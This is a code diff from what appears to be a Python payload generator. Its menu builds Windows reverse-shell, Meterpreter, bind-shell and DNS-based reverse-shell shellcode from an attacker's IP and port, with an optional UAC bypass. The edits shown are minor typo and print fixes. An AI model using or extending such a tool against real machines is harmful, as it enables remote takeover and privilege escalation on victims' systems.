@@ -72,7 +72,7 @@ try:
         if menuchoice == '1':
             payloadchoice = SHELLCODE.windows_rev_shell
             payload = 'Windows Reverse Shell'
-            breaklll
+            break
         elif menuchoice == '2':
             payloadchoice = SHELLCODE.windows_met_rev_shell
             payload = 'Windows Meterpreter Reverse Shell'
@@ -109,8 +109,6 @@ try:
             print t.bold_red + 'Error Getting Ip Automatically'
             ipaddr = raw_input(
                 '\n[*] Please Enter Your IP Manually(Automatic Disabled)\n[*] IP> ')
-
-        print t.bold_green + '\n[*] IP SET AS %s\n[*] PORT SET AS %s\n' % (ipaddr, portnum) + t.normal
         try:
             if menuchoice == '4':
                 iphex = ipaddr
@@ -133,6 +131,8 @@ try:
             shellcode = payloadchoice % (porthex, iphex)
         else:
             shellcode = payloadchoice % (iphex, porthex)
+        print t.bold_green + '[*] IP SET AS %s\n[*] PORT SET AS %s\n' % (ipaddr, portnum) + t.normal
+
     elif menuchoice == '3':
         bindport = raw_input(
             '\n[*] Press Enter For Default Bind Port(4444)\n[*] Port> ')
@@ -144,6 +144,8 @@ try:
             print t.bold_red + '[*] Error in Port Syntax'
             sys.exit(1)
         shellcode = payloadchoice % (bindporthex)
+        print t.bold_green + '\n[*] PORT SET AS %s\n' % (bindport) + t.normal
+
     elif menuchoice == '5':
         portnum = raw_input(
             '\n[*] Press Enter For Default Port(4444)\n[*] Port> ')
@@ -155,8 +157,9 @@ try:
             print t.bold_red + '[*] Error in Port Syntax'
             sys.exit(1)
         DNSaddr = raw_input(
-            '\n[*] Please Enter DNS Name Manually\n[*] DNS> ')
+            '\n[*] Please Enter DNS Hostname Manually\n[*] DNS> ')
         shellcode = payloadchoice % (DNSaddr,porthex)
+        print t.bold_green + '[*] DNS HOSTNAME SET AS %s\n[*] PORT SET AS %s\n' % (DNSaddr, portnum) + t.normal
 
     if menuchoice == '2' or menuchoice == '3' or menuchoice == '4' or menuchoice == '5':
         want_UACBYPASS = raw_input(
